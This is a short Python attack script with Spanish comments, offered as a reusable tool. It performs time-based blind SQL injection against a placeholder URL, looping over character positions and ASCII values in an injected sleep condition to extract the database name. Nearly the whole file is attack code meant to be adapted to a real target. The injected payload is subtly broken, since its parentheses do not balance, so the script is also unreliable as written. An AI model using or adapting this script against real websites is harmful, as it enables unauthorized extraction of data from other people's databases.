#!/usr/bin/python3

import requests
import sys
import time 
import signal
from pwn import *

def def_handler(sig, frame):
  print("\n\n[+] Saliendo ...\n")
  sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variales Globales
main_url = "https://example.com/example.php" # Url vulnerable
characters = string.printable

def makeSQLI():

  p1 = log.progress("Fuerza Bruta")
  p1.status("Iniciando proceso de fuerza bruta")

  time.sleep(2)

  p2 = log.progress("Datos extraidos")
  extracted_info = ""

  for position in range(1, 50):  # Cambiar dependiendo de el tamaño de caracteres a buscar
    for character in range(33, 126):
      sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1)=%d,sleep(0.5),1 " % (position, character)
# Modificar sqli_url segun la necesidad o tipo de query a utilizar 
      p1.status(sqli_url)

      time_start = time.time()
      
      r = requests.get(sqli_url)

      time_end = time.time()
      
      if time_end - time_start > 0.5 :
        extracted_info += chr(character)
        p2.status(extracted_info)
        break
if __name__ == '__main__':

    makeSQLI()
